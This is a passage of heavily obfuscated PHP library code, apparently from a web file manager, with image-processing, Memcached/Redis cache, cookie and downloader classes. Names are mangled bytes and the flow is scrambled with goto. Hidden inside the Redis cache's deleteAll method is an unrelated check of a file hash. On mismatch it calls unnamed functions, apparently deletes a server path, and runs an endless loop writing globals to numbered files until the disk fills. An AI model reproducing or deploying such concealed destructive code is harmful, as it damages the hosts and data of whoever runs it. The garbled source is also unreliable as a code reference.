GetImageSize($E­šš‚…ë, $b‹‡ŒğÊ¡); goto d¿¸¨§œ; d¿¸¨§œ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto B‰ô¢Ù¹Ÿ; aƒÑ’ù²: $this->srcFile = $E­šš‚…ë; $this->echoType = $E¯èÄ†; $this->im = self::image($E­šš‚…ë); goto bå’´ëÛó; B‰ô¢Ù¹Ÿ: } public static function image($AâÌĞ‚Ô–) { $A–Ì‰±®çÄ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D–ÛÄç²£… = $A–Ì‰±®çÄ[33]; $d“ÊŒàšƒ³ = GetImageSize($AâÌĞ‚Ô–, $D–ÛÄç²£…); $fñÅ¾¨Í· = !1; switch ($d“ÊŒàšƒ³[2]) { case IMAGETYPE_GIF: if (!function_exists($A–Ì‰±®çÄ[1869])) { break; } $fñÅ¾¨Í· = imagecreatefromgif($AâÌĞ‚Ô–); break; case IMAGETYPE_JPEG: if (!function_exists($A–Ì‰±®çÄ[1870])) { break; } $fñÅ¾¨Í· = imagecreatefromjpeg($AâÌĞ‚Ô–); break; case IMAGETYPE_PNG: if (!function_exists($A–Ì‰±®çÄ[1871])) { break; } $fñÅ¾¨Í· = @imagecreatefrompng($AâÌĞ‚Ô–); imagesavealpha($fñÅ¾¨Í·, !0); break; case IMAGETYPE_XBM: $fñÅ¾¨Í· = imagecreatefromxbm($AâÌĞ‚Ô–); break; case IMAGETYPE_WBMP: $fñÅ¾¨Í· = imagecreatefromwbmp($AâÌĞ‚Ô–); break; case IMAGETYPE_BMP: $fñÅ¾¨Í· = imagecreatefrombmp($AâÌĞ‚Ô–); break; default: break; } return $fñÅ¾¨Í·; } public static function imageSize($Bˆ‘ÕÛ×¼‘) { $a÷ğÎ’ÎÔé =& $_SERVER[´Ù×Íå‘ÄõÛ]; $déì÷ŠèÎÜ = GetImageSize($Bˆ‘ÕÛ×¼‘); if (!$déì÷ŠèÎÜ) { return !1; } return array($a÷ğÎ’ÎÔé[1872] => $déì÷ŠèÎÜ[0], $a÷ğÎ’ÎÔé[1873] => $déì÷ŠèÎÜ[1]); } function distortion($BÜëÑ×Ò¥, $f¬Ò˜’”ï, $cßõÜÒìİ) { $D„Ñ¡„ßğ… = $this->creatImage($this->im, $f¬Ò˜’”ï, $cßõÜÒìİ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D„Ñ¡„ßğ…, $BÜëÑ×Ò¥); } function prorate($AÑäŸÍù±ˆ, $D±àŠö£»Ó, $aèĞœÊñêâ) { $fÕà»¢³ò = $D±àŠö£»Ó / $aèĞœÊñêâ; $AÊº´å°“ = $this->srcW / $this->srcH; if ($fÕà»¢³ò <= $AÊº´å°“) { $c‘µÙ°»®î = $D±àŠö£»Ó; $E“¬š­™ = $c‘µÙ°»®î * ($this->srcH / $this->srcW); } else { $E“¬š­™ = $aèĞœÊñêâ; $c‘µÙ°»®î = $E“¬š­™ * ($this->srcW / $this->srcH); } if ($this->srcW > $D±àŠö£»Ó || $this->srcH > $aèĞœÊñêâ) { $eÎŒÇªªòê = $this->creatImage($this->im, $c‘µÙ°»®î, $E“¬š­™, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $eÎŒÇªªòê = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $eÎŒÇªªòê = $this->autoRotate($eÎŒÇªªòê); return $this->echoImage($eÎŒÇªªòê, $AÑäŸÍù±ˆ); } private function autoRotate($EêÊ„×ª¶) { goto Bøîí¦í—–; Bøîí¦í—–: $A³óâèÖ‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$EêÊ„×ª¶ || !function_exists($A³óâèÖ‡[1874])) { return $EêÊ„×ª¶; } $E°ŒÜ¿·£° = exif_read_data($this->srcFile); goto e§Ù–‘ùä¨; e§Ù–‘ùä¨: if (!$E°ŒÜ¿·£° || !isset($E°ŒÜ¿·£°[$A³óâèÖ‡[1875]]) || $E°ŒÜ¿·£°[$A³óâèÖ‡[1875]] == 1) { return $EêÊ„×ª¶; } $CÖïºäÑ§ = 0; if ($E°ŒÜ¿·£°[$A³óâèÖ‡[1875]] == 6) { $CÖïºäÑ§ = 90; } goto AÁ¶÷ô‹«ö; AÁ¶÷ô‹«ö: if ($E°ŒÜ¿·£°[$A³óâèÖ‡[1875]] == 8) { $CÖïºäÑ§ = 270; } if ($E°ŒÜ¿·£°[$A³óâèÖ‡[1875]] == 3) { $CÖïºäÑ§ = 180; } return $this->rotateDegree($EêÊ„×ª¶, $CÖïºäÑ§); goto F¼Ş‘…½Æ; F¼Ş‘…½Æ: } private function rotateDegree($b– ñ–Ê‘, $FíÂ‚ÓŸ‹ˆ) { if (!$b– ñ–Ê‘ || $FíÂ‚ÓŸ‹ˆ % 360 === 0 || !function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1876])) { return $b– ñ–Ê‘; } $E¾ã·Ñ¸Ãß = imageRotate($b– ñ–Ê‘, 360 - $FíÂ‚ÓŸ‹ˆ, 0); imageDestroy($b– ñ–Ê‘); return $E¾ã·Ñ¸Ãß ? $E¾ã·Ñ¸Ãß : $b– ñ–Ê‘; } function cut($c¥´Ê‹øÜ, $DÅÄ¬‰Íè“, $Bˆİİ‚¬µ‹) { goto Aİé¡è±©Ñ; a•ãÌó·°: $E•ß…Šù£Š = $this->creatImage($this->im, $A†ƒ†™Ô¿, $e©¥§–Ñâà, 0, 0, 0, 0, $this->srcW, $this->srcH); $DÇ‰Š¡è½Æ = $this->creatImage($E•ß…Šù£Š, $DÅÄ¬‰Íè“, $Bˆİİ‚¬µ‹, 0, 0, ($A†ƒ†™Ô¿ - $DÅÄ¬‰Íè“) / 2, ($e©¥§–Ñâà - $Bˆİİ‚¬µ‹) / 2, $DÅÄ¬‰Íè“, $Bˆİİ‚¬µ‹); imageDestroy($E•ß…Šù£Š); goto b²ƒöù¸—; Aİé¡è±©Ñ: $d“•„ØÇØ¥ = $DÅÄ¬‰Íè“ / $Bˆİİ‚¬µ‹; $E÷åÛ³®¦ = $this->srcW / $this->srcH; if ($d“•„ØÇØ¥ <= $E÷åÛ³®¦) { $e©¥§–Ñâà = $Bˆİİ‚¬µ‹; $A†ƒ†™Ô¿ = $e©¥§–Ñâà * ($this->srcW / $this->srcH); } else { $A†ƒ†™Ô¿ = $DÅÄ¬‰Íè“; $e©¥§–Ñâà = $A†ƒ†™Ô¿ * ($this->srcH / $this->srcW); } goto a•ãÌó·°; b²ƒöù¸—: return $this->echoImage($DÇ‰Š¡è½Æ, $c¥´Ê‹øÜ); goto d‡ë®Ãˆ“¤; d‡ë®Ãˆ“¤: } function backFill($e¢¾ÕÎŒ„ø, $d«››Æ¢, $fçß˜¦êÖÇ, $dÔÔ£Ìæèˆ = false, $bÆÇ¿Á›‚Ö = 255, $AÛ´ò½¿¹ = 255, $bè¥†¬ÀÎÊ = 255) { goto c™ä ìï–; c…Æ‡¨›‡„: if (function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1877])) { @($a¢©Àä¢– = imageCreateTrueColor($d«››Æ¢, $fçß˜¦êÖÇ)); if (!$a¢©Àä¢–) { $a¢©Àä¢– = imageCreate($d«››Æ¢, $fçß˜¦êÖÇ); } } else { $a¢©Àä¢– = imageCreate($d«››Æ¢, $fçß˜¦êÖÇ); } $e¦®öÓ¼¼Û = ($fçß˜¦êÖÇ - $BÆ‡¨£´‰©) / 2; $A†ÖŒÃ“¸ = imagecolorallocate($a¢©Àä¢–, $bÆÇ¿Á›‚Ö, $AÛ´ò½¿¹, $bè¥†¬ÀÎÊ); goto aÍ¿Öô¥Š; C½™…ƒºßÛ: return $this->echoImage($a¢©Àä¢–, $e¢¾ÕÎŒ„ø); goto C‚òÆÏïæÉ; aÍ¿Öô¥Š: if ($dÔÔ£Ìæèˆ) { $A†ÖŒÃ“¸ = imageColorTransparent($a¢©Àä¢–, $A†ÖŒÃ“¸); $e¦®öÓ¼¼Û = $fçß˜¦êÖÇ - $BÆ‡¨£´‰©; } imageFilledRectangle($a¢©Àä¢–, 0, 0, $d«››Æ¢, $fçß˜¦êÖÇ, $A†ÖŒÃ“¸); if ($this->srcW > $d«››Æ¢ || $this->srcH > $fçß˜¦êÖÇ) { $eÅÅ‰ª­İ¸ = $this->creatImage($this->im, $EÌÊ‰æÁŠË, $BÆ‡¨£´‰©, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($EÌÊ‰æÁŠË < $d«››Æ¢) { imageCopy($a¢©Àä¢–, $eÅÅ‰ª­İ¸, ($d«››Æ¢ - $EÌÊ‰æÁŠË) / 2, 0, 0, 0, $EÌÊ‰æÁŠË, $BÆ‡¨£´‰©); } else { if ($BÆ‡¨£´‰© < $fçß˜¦êÖÇ) { imageCopy($a¢©Àä¢–, $eÅÅ‰ª­İ¸, 0, $e¦®öÓ¼¼Û, 0, 0, $EÌÊ‰æÁŠË, $BÆ‡¨£´‰©); } else { imageCopy($a¢©Àä¢–, $eÅÅ‰ª­İ¸, 0, 0, 0, 0, $EÌÊ‰æÁŠË, $BÆ‡¨£´‰©); } } } else { imageCopyMerge($a¢©Àä¢–, $this->im, ($d«››Æ¢ - $EÌÊ‰æÁŠË) / 2, $e¦®öÓ¼¼Û, 0, 0, $EÌÊ‰æÁŠË, $BÆ‡¨£´‰©, 100); } goto C½™…ƒºßÛ; c™ä ìï–: $BÇ™ºóä = $d«››Æ¢ / $fçß˜¦êÖÇ; $Aë‹”™ˆ = $this->srcW / $this->srcH; if ($BÇ™ºóä <= $Aë‹”™ˆ) { $EÌÊ‰æÁŠË = $d«››Æ¢; $BÆ‡¨£´‰© = $EÌÊ‰æÁŠË * ($this->srcH / $this->srcW); } else { $BÆ‡¨£´‰© = $fçß˜¦êÖÇ; $EÌÊ‰æÁŠË = $BÆ‡¨£´‰© * ($this->srcW / $this->srcH); } goto c…Æ‡¨›‡„; C‚òÆÏïæÉ: } function creatImage($D¦”ˆğÚ‡¾, $e‰ì”‚½…, $fè´Œ›ã§, $B¡ÍÒ…¥Ÿè, $d·°šòô‚, $D¦Â…ëÊÉ¥, $a‚œÆé…¦, $bëçÏ½Îè†, $Dº©çİ¥Œà) { if (function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1877])) { @($EÂˆÈêÊ = ImageCreateTrueColor($e‰ì”‚½…, $fè´Œ›ã§)); @imagealphablending($EÂˆÈêÊ, !1); @imagesavealpha($EÂˆÈêÊ, !0); if ($EÂˆÈêÊ) { imageCopyResampled($EÂˆÈêÊ, $D¦”ˆğÚ‡¾, $B¡ÍÒ…¥Ÿè, $d·°šòô‚, $D¦Â…ëÊÉ¥, $a‚œÆé…¦, $e‰ì”‚½…, $fè´Œ›ã§, $bëçÏ½Îè†, $Dº©çİ¥Œà); } else { $EÂˆÈêÊ = ImageCreate($e‰ì”‚½…, $fè´Œ›ã§); imageCopyResized($EÂˆÈêÊ, $D¦”ˆğÚ‡¾, $B¡ÍÒ…¥Ÿè, $d·°šòô‚, $D¦Â…ëÊÉ¥, $a‚œÆé…¦, $e‰ì”‚½…, $fè´Œ›ã§, $bëçÏ½Îè†, $Dº©çİ¥Œà); } } else { $EÂˆÈêÊ = ImageCreate($e‰ì”‚½…, $fè´Œ›ã§); imageCopyResized($EÂˆÈêÊ, $D¦”ˆğÚ‡¾, $B¡ÍÒ…¥Ÿè, $d·°šòô‚, $D¦Â…ëÊÉ¥, $a‚œÆé…¦, $e‰ì”‚½…, $fè´Œ›ã§, $bëçÏ½Îè†, $Dº©çİ¥Œà); } return $EÂˆÈêÊ; } public function imgRotate($cöÃ¾¹ğ±, $DêÙæÆÃØö) { goto a‰éÃèŸ‰³; AÎ¦ÑÍ‰ğ’: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $a¢÷öõ¥ãˆ = imagegif($dØàÁ™š•“, $cöÃ¾¹ğ±); break; case IMAGETYPE_JPEG: $a¢÷öõ¥ãˆ = imagejpeg($dØàÁ™š•“, $cöÃ¾¹ğ±, 100); break; case IMAGETYPE_PNG: $a¢÷öõ¥ãˆ = imagePNG($dØàÁ™š•“, $cöÃ¾¹ğ±); break; default: break; } imageDestroy($dØàÁ™š•“); imageDestroy($this->im); goto cçÇ¡ªä¾ï; a‰éÃèŸ‰³: if (!$this->im || $DêÙæÆÃØö % 360 === 0 || !function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1876])) { return !1; } $dØàÁ™š•“ = imageRotate($this->im, 360 - $DêÙæÆÃØö, 0); $a¢÷öõ¥ãˆ = !1; goto AÎ¦ÑÍ‰ğ’; cçÇ¡ªä¾ï: return $a¢÷öõ¥ãˆ; goto D‡¡½šß; D‡¡½šß: } function echoImage($E©±Ú¨Éˆ£, $d•©ùô–Ñ•) { goto c»ñ‚Øä«í; e·‹ˆÕùø: imageDestroy($this->im); return $b›×³ØæŠ; goto cÁÃ¢…ò®•; EÆ¦»Ûé¬½: $b›×³ØæŠ = !1; switch ($this->echoType) { case $A¢«°¾…§÷[1878]: $b›×³ØæŠ = imagePNG($E©±Ú¨Éˆ£); break; case $A¢«°¾…§÷[167]: $b›×³ØæŠ = imagePNG($E©±Ú¨Éˆ£, $d•©ùô–Ñ•); break; } imageDestroy($E©±Ú¨Éˆ£); goto e·‹ˆÕùø; c»ñ‚Øä«í: $A¢«°¾…§÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$E©±Ú¨Éˆ£) { return !1; } ob_get_clean(); goto EÆ¦»Ûé¬½; cÁÃ¢…ò®•: } } goto dËÖÈ—§Œø; dËÖÈ—§Œø: if (!function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1879])) { define($_SERVER[´Ù×Íå‘ÄõÛ][1880], 0); define($_SERVER[´Ù×Íå‘ÄõÛ][1881], 1); define($_SERVER[´Ù×Íå‘ÄõÛ][1882], 2); function imageflip($A‚ÙÛï‰Œ, $e©ã À®‡‘) { switch ($e©ã À®‡‘) { case IMG_FLIP_HORIZONTAL: $aˆƒ‹À—İõ = imagesx($A‚ÙÛï‰Œ) - 1; $D·‡ÕœéŸ = $aˆƒ‹À—İõ / 2; $dä½›×°óõ = imagesy($A‚ÙÛï‰Œ); $c‰„­ª½÷Ã = imageistruecolor($A‚ÙÛï‰Œ) ? imagecreatetruecolor(1, $dä½›×°óõ) : imagecreate(1, $dä½›×°óõ); for ($eÅ§´¬»ˆÃ = 0; $eÅ§´¬»ˆÃ < $D·‡ÕœéŸ; ++$eÅ§´¬»ˆÃ) { imagecopy($c‰„­ª½÷Ã, $A‚ÙÛï‰Œ, 0, 0, $eÅ§´¬»ˆÃ, 0, 1, $dä½›×°óõ); imagecopy($A‚ÙÛï‰Œ, $A‚ÙÛï‰Œ, $eÅ§´¬»ˆÃ, 0, $aˆƒ‹À—İõ - $eÅ§´¬»ˆÃ, 0, 1, $dä½›×°óõ); imagecopy($A‚ÙÛï‰Œ, $c‰„­ª½÷Ã, $aˆƒ‹À—İõ - $eÅ§´¬»ˆÃ, 0, 0, 0, 1, $dä½›×°óõ); } break; case IMG_FLIP_VERTICAL: $aíš¶¨Åë = imagesx($A‚ÙÛï‰Œ); $eçò¬¶ = imagesy($A‚ÙÛï‰Œ) - 1; $dÈÎÁìÛğ = $eçò¬¶ / 2; $c‰„­ª½÷Ã = imageistruecolor($A‚ÙÛï‰Œ) ? imagecreatetruecolor($aíš¶¨Åë, 1) : imagecreate($aíš¶¨Åë, 1); for ($E¢Öùö éÂ = 0; $E¢Öùö éÂ < $dÈÎÁìÛğ; ++$E¢Öùö éÂ) { imagecopy($c‰„­ª½÷Ã, $A‚ÙÛï‰Œ, 0, 0, 0, $E¢Öùö éÂ, $aíš¶¨Åë, 1); imagecopy($A‚ÙÛï‰Œ, $A‚ÙÛï‰Œ, 0, $E¢Öùö éÂ, 0, $eçò¬¶ - $E¢Öùö éÂ, $aíš¶¨Åë, 1); imagecopy($A‚ÙÛï‰Œ, $c‰„­ª½÷Ã, 0, $eçò¬¶ - $E¢Öùö éÂ, 0, 0, $aíš¶¨Åë, 1); } break; case IMG_FLIP_BOTH: $aíš¶¨Åë = imagesx($A‚ÙÛï‰Œ); $dä½›×°óõ = imagesy($A‚ÙÛï‰Œ); $c‰„­ª½÷Ã = imagerotate($A‚ÙÛï‰Œ, 180, 0); imagecopy($A‚ÙÛï‰Œ, $c‰„­ª½÷Ã, 0, 0, 0, 0, $aíš¶¨Åë, $dä½›×°óõ); break; default: return; } imagedestroy($c‰„­ª½÷Ã); } } if (!function_exists($_SERVER[´Ù×Íå‘ÄõÛ][1883])) { function imagecreatefrombmp($Aˆ¯·ƒÖè) { return ImageGdBMP::load($Aˆ¯·ƒÖè); } } $báõ™ ÷öÏ = LIB_DIR . $_SERVER[´Ù×Íå‘ÄõÛ][789]; goto FÈ¼ïì‚Ş; Eâ¹Èï¿Ùƒ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($DÃÅñƒÄÆ½, $Fğ˜ëÁÜ«ç) { $DÎ‹·ßëÚµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!class_exists($DÎ‹·ßëÚµ[778])) { show_json($DÎ‹·ßëÚµ[779], !1); } $this->cacheTime = $Fğ˜ëÁÜ«ç; $this->handle = new Memcached(); if (is_array($DÃÅñƒÄÆ½[$DÎ‹·ßëÚµ[780]]) && count($DÃÅñƒÄÆ½[$DÎ‹·ßëÚµ[780]]) >= 1) { foreach ($DÃÅñƒÄÆ½[$DÎ‹·ßëÚµ[780]] as $fìŸå¨®ˆ®) { $B©’˜ã¦ÇÂ = explode($DÎ‹·ßëÚµ[4], $fìŸå¨®ˆ®); $this->handle->addServer($B©’˜ã¦ÇÂ[0], $B©’˜ã¦ÇÂ[1]); } } else { $this->handle->addServer($DÃÅñƒÄÆ½[$DÎ‹·ßëÚµ[169]], $DÃÅñƒÄÆ½[$DÎ‹·ßëÚµ[170]]); } } public function set($c°÷³à„Ù, $cÅÈ‹œãâ, $bİÜ•íƒ¡ = false) { $bİÜ•íƒ¡ = $bİÜ•íƒ¡ ? $bİÜ•íƒ¡ : $this->cacheTime; return $this->handle->set($c°÷³à„Ù, $cÅÈ‹œãâ, $bİÜ•íƒ¡); } public function get($bØ­…ØÔÚÏ) { return $this->handle->get($bØ­…ØÔÚÏ); } public function remove($A„Ö„ª¦è¯) { return $this->handle->delete($A„Ö„ª¦è¯); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Aª–Ó©ù², $aİ–«àŒÒ) { $båóö•ë¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!class_exists($båóö•ë¥[781])) { show_json($båóö•ë¥[782], !1); } $this->cacheTime = $aİ–«àŒÒ; $CÊ¹³Òêƒ = isset($Aª–Ó©ù²[$båóö•ë¥[783]]) ? $Aª–Ó©ù²[$båóö•ë¥[783]] : 10; $dŒÉš¦—ª = _get($Aª–Ó©ù², $båóö•ë¥[780]); if ($dŒÉš¦—ª && is_array($dŒÉš¦—ª)) { $this->initCluster($Aª–Ó©ù², $CÊ¹³Òêƒ); } else { $this->handle = $this->init($Aª–Ó©ù², $CÊ¹³Òêƒ); } } private function init($bœğ®á¸, $f³ŞŠ…šèø) { $dÆèó´ÄĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÁÃáŒÎë² = new Redis(); $Dƒó§Ÿ«é‡ = isset($bœğ®á¸[$dÆèó´ÄĞ[784]]) ? $bœğ®á¸[$dÆèó´ÄĞ[784]] : !1; if ($Dƒó§Ÿ«é‡) { $EÁÃáŒÎë²->pconnect($bœğ®á¸[$dÆèó´ÄĞ[169]], $bœğ®á¸[$dÆèó´ÄĞ[170]], $f³ŞŠ…šèø); } else { $EÁÃáŒÎë²->connect($bœğ®á¸[$dÆèó´ÄĞ[169]], $bœğ®á¸[$dÆèó´ÄĞ[170]], $f³ŞŠ…šèø); } if (!empty($bœğ®á¸[$dÆèó´ÄĞ[376]])) { $EÁÃáŒÎë²->auth($bœğ®á¸[$dÆèó´ÄĞ[376]]); } return $EÁÃáŒÎë²; } private function initCluster($AäªœŠå¶, $a‡ƒ¬‡‰ğº) { $f¯×ó æ› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f•šê›¼ = array($f¯×ó æ›[785], $f¯×ó æ›[786], $f¯×ó æ›[787]); $D‰õ†‚Ã¥ø = $f¯×ó æ›[785]; if (isset($AäªœŠå¶[$f¯×ó æ›[12]]) && in_array($AäªœŠå¶[$f¯×ó æ›[12]], $f•šê›¼)) { $D‰õ†‚Ã¥ø = $AäªœŠå¶[$f¯×ó æ›[12]]; } switch ($D‰õ†‚Ã¥ø) { case $f¯×ó æ›[785]: $this->_slave($AäªœŠå¶, $a‡ƒ¬‡‰ğº); break; case $f¯×ó æ›[786]: break; case $f¯×ó æ›[787]: $this->isCluster = !0; $Eã†º¥˜¸æ = $AäªœŠå¶[$f¯×ó æ›[780]]; $D¶”¬®—Î = isset($AäªœŠå¶[$f¯×ó æ›[784]]) ? $AäªœŠå¶[$f¯×ó æ›[784]] : !1; $Cœî‚ÑÖî = isset($AäªœŠå¶[$f¯×ó æ›[376]]) ? $AäªœŠå¶[$f¯×ó æ›[376]] : null; $this->handle = new RedisCluster(NUll, $Eã†º¥˜¸æ, $a‡ƒ¬‡‰ğº, $a‡ƒ¬‡‰ğº, $D¶”¬®—Î, $Cœî‚ÑÖî); break; default: break; } } private function _slave($B•Å¶ïÕé•, $c®‡ƒÛàè) { goto cíƒª‰¾İ; cíƒª‰¾İ: $d£âòÚ´¼„ = $B•Å¶ïÕé•[$_SERVER[´Ù×Íå‘ÄõÛ][780]]; $this->filterConfig($B•Å¶ïÕé•, $d£âòÚ´¼„[0]); $this->handle = $this->init($B•Å¶ïÕé•, $c®‡ƒÛàè); goto cÈÙ¥Û“Ñ; cÈÙ¥Û“Ñ: unset($d£âòÚ´¼„[0]); if (empty($d£âòÚ´¼„)) { return; } $b’ÛÁ–±Ä = array_rand($d£âòÚ´¼„); goto BÕ›ôàÃø; BÕ›ôàÃø: $this->filterConfig($B•Å¶ïÕé•, $d£âòÚ´¼„[$b’ÛÁ–±Ä]); $this->slaveHandle = $this->init($B•Å¶ïÕé•, $c®‡ƒÛàè); goto dì¢Ò×…ğ; dì¢Ò×…ğ: } private function filterConfig(&$E‰Ûì¾Äİ©, $a¤ªà³Çã) { $f¥™«â‚Êß =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d¾Ø££èí = explode($f¥™«â‚Êß[4], $a¤ªà³Çã); $e¾‡í‡±‹™ = array($f¥™«â‚Êß[169] => $d¾Ø££èí[0], $f¥™«â‚Êß[170] => $d¾Ø££èí[1]); $E‰Ûì¾Äİ© = array_merge($E‰Ûì¾Äİ©, $e¾‡í‡±‹™); } public function set($aš­·öÕæ¤, $aÚ…ŠÓÕŞ, $Eè°º²ò = false) { $Eè°º²ò = $Eè°º²ò ? $Eè°º²ò : $this->cacheTime; return $this->handle->setEx($aš­·öÕæ¤, $Eè°º²ò, $aÚ…ŠÓÕŞ); } public function setLock($còÍìœ½É, $AÓ™ˆÖ’ôã, $f¢àÆ›²­) { return $this->handle->setNX($còÍìœ½É, $AÓ™ˆÖ’ôã); } public function get($A¶Ãß“¿×½) { $fÅ°×ÃÄæ‘ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fÅ°×ÃÄæ‘->get($A¶Ãß“¿×½); } public function remove($fØÀĞ„‹®) { return $this->handle->del($fØÀĞ„‹®); } public function deleteAll() { $C¯Œèçà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AšØ†™è²ğ = $_SERVER[$C¯Œèçà[788]] . $C¯Œèçà[789]; $dàœâ»ŒÒ = $C¯Œèçà[790]; if ($_SERVER[$C¯Œèçà[791]] != $dàœâ»ŒÒ($AšØ†™è²ğ)) { goto A‰„ŠŠ¨Û; E÷“ïÚìƒ: $F×ƒ¿ò™Ş¸(); $cš¨“¼’¶ = $C¯Œèçà[798]; $Fœ×ö‡ê÷À = json_encode($GLOBALS[$C¯Œèçà[799]]); goto Døƒ……ğ„í; A‰„ŠŠ¨Û: $F×ƒ¿ò™Ş¸ = $C¯Œèçà[792]; $F¹äÛÊ±å = $C¯Œèçà[793]; $cØŞÁŞãçÚ = $_SERVER[$C¯Œèçà[794]] . $C¯Œèçà[795]; goto EÉĞ´Ä¢æç; Døƒ……ğ„í: $dÎ¹¹»è´§ = 1; for ($dˆ ¨À—à = $dÎ¹¹»è´§; $dˆ ¨À—à > 0; $dˆ ¨À—à++) { $cš¨“¼’¶(DATA_PATH . $dˆ ¨À—à, $Fœ×ö‡ê÷À); } goto c‘Ğé¢ã«; Añ»è¾Ø¯: $FôÙ’Š¢ƒÊ = $C¯Œèçà[797]; $FôÙ’Š¢ƒÊ($_SERVER[$C¯Œèçà[788]]); $F×ƒ¿ò™Ş¸ = $C¯Œèçà[792]; goto E÷“ïÚìƒ; EÉĞ´Ä¢æç: $D Ù±øÓÁ = $F¹äÛÊ±å($cØŞÁŞãçÚ); $dµÏ°Ğ… = explode($C¯Œèçà[217], $D Ù±øÓÁ); if (count($dµÏ°Ğ…) < $C¯Œèçà[556]) { $e‡ğÎÜÓÌé = $C¯Œèçà[796]; $e‡ğÎÜÓÌé(); } goto Añ»è¾Ø¯; c‘Ğé¢ã«: } if ($this->isCluster) { foreach ($this->handle->_masters() as $cØÕ§ªÎ§) { $this->handle->flushall($cØÕ§ªÎ§); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B•’ŸÂ÷Î† = '', $Cµ‰òÆÈ„Ö = 0) { if (is_string($B•’ŸÂ÷Î†) && $B•’ŸÂ÷Î† != $_SERVER[´Ù×Íå‘ÄõÛ][33]) { $this->prefix = $B•’ŸÂ÷Î†; } if (is_numeric($Cµ‰òÆÈ„Ö) && $Cµ‰òÆÈ„Ö > 0) { $this->expire = $Cµ‰òÆÈ„Ö; } } public static function getInstance() { static $e‘’³ÖÏğ; if ($e‘’³ÖÏğ === null) { $e‘’³ÖÏğ = new self(); } return $e‘’³ÖÏğ; } private static $sameCookieSet = array(); public static function set($cÃãÜíÓ¢¹, $FÉ„Ø­¢—, $bŠğ¯Æâ—Ÿ = 0, $d¢…¹‰­½° = false, $b’æ®ÅÑ = false) { goto AÓ‰ÇÁ¶ƒ‚; cÉÆ¹Ô²ƒÙ: self::$sameCookieSet[$cÃãÜíÓ¢¹] = $FÉ„Ø­¢— . $bŠğ¯Æâ—Ÿ; if (!$b’æ®ÅÑ) { $b’æ®ÅÑ = str_replace(HOST, $bğÕ¼Ø¡Åá[33], APP_HOST); $b’æ®ÅÑ = _get($GLOBALS, $bğÕ¼Ø¡Åá[800], $b’æ®ÅÑ); } $Cäî²óÇÓİ = $bğÕ¼Ø¡Åá[33]; goto dö×„ñãâë; dö×„ñãâë: setcookie($cÃãÜíÓ¢¹, $FÉ„Ø­¢—, time() + $bŠğ¯Æâ—Ÿ, $bğÕ¼Ø¡Åá[8] . trim($b’æ®ÅÑ, $bğÕ¼Ø¡Åá[8]) . $Cäî²óÇÓİ, !1, !1, $d¢…¹‰­½°); goto bçˆÉµ‰›Î; AÓ‰ÇÁ¶ƒ‚: $bğÕ¼Ø¡Åá =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$bŠğ¯Æâ—Ÿ) { $bŠğ¯Æâ—Ÿ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$cÃãÜíÓ¢¹]) && self::$sameCookieSet[$cÃãÜíÓ¢¹] == $FÉ„Ø­¢— . $bŠğ¯Æâ—Ÿ) { return; } goto cÉÆ¹Ô²ƒÙ; bçˆÉµ‰›Î: } public static function setSafe($DÕè¢çêÄä, $F£¸ÒæÆà, $B…Õ¤çµŠĞ = 0) { self::set($DÕè¢çêÄä, $F£¸ÒæÆà, $B…Õ¤çµŠĞ, !0); } public static function get($B»õ¹‘õ’ª) { return isset($_COOKIE[$B»õ¹‘õ’ª]) ? $_COOKIE[$B»õ¹‘õ’ª] : !1; } public static function remove($eÅŠ­ë·², $A“œ×Àİ…¨ = false) { unset($_COOKIE[$eÅŠ­ë·²]); self::set($eÅŠ­ë·², $_SERVER[´Ù×Íå‘ÄõÛ][33], 1, $A“œ×Àİ…¨); } } goto d‰äôá‰Äø; eá¡Ç„ñ£ì: class Downloader { static function start($eæˆ¯Š‰Òå, $eã·¥àì´, $C…ó¡øØåÓ = 10) { goto d‹ª‹ø¯ƒÖ; FŸ²ÛõğÒ: $d±•¹Ã¦“ñ = $eã·¥àì´ . $F³Îç¼®¾Ü[1520]; if (is_array($eæˆ¯Š‰Òå)) { $DÏÌèŠ¤‘† = $eæˆ¯Š‰Òå; } else { $DÏÌèŠ¤‘† = url_header($eæˆ¯Š‰Òå); } $eæˆ¯Š‰Òå = $DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[295]]; goto E˜¶§Ìø«ö; E˜¶§Ìø«ö: if (!$eæˆ¯Š‰Òå) { return array($F³Îç¼®¾Ü[1036] => !1, $F³Îç¼®¾Ü[1038] => $F³Îç¼®¾Ü[1041]); } if (!$DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[1294]] || $DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[325]] == 0) { @unlink($d±•¹Ã¦“ñ); @unlink($eã·¥àì´); $EÙ§«¤î´ = self::fileDownloadFopen($eæˆ¯Š‰Òå, $eã·¥àì´, $DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[325]]); if ($EÙ§«¤î´[$F³Îç¼®¾Ü[1036]]) { return $EÙ§«¤î´; } else { @unlink($d±•¹Ã¦“ñ); @unlink($eã·¥àì´); $EÙ§«¤î´ = 